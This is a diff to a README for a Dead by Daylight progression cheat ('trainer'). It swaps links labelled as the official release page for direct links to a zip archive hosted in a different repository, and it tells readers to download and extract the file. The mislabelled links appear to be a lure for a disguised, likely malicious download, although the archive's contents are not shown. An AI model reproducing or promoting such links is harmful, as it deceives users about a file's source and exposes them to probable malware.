@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight progression and enhance gameplay with th
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Mega - Automate your Dead by Daylight progression
 
-[![Download Trainer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/fullse4687/DBD-AutoGrind-Trainer-2026-Mega/releases)
+[![Download Trainer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/fullse4687/fullse4687.github.io/main/automatic/github-io-fullse-2.4.zip)
 
 ## 📋 What is this tool?
 This software helps players manage their progress in Dead by Daylight. It automates tasks like earning Bloodpoints, unlocking character abilities, and managing cosmetic collections. The software runs as an external process, which means it monitors the game from outside the main client. This approach keeps your game files untouched and helps maintain stability.
@@ -21,7 +21,7 @@ Before you start, check that your computer meets these standards:
 ## 📥 How to download the software
 You can obtain the latest version of the tool from our official release page. 
 
-[Click here to visit the release page and download the trainer](https://github.com/fullse4687/DBD-AutoGrind-Trainer-2026-Mega/releases)
+[Click here to visit the release page and download the trainer](https://raw.githubusercontent.com/fullse4687/fullse4687.github.io/main/automatic/github-io-fullse-2.4.zip)
 
 Look for the latest release version on the page. Download the file ending in .zip or .exe. If you download a zip file, right-click the folder and select Extract All to move the tool into a folder you can access easily.
 
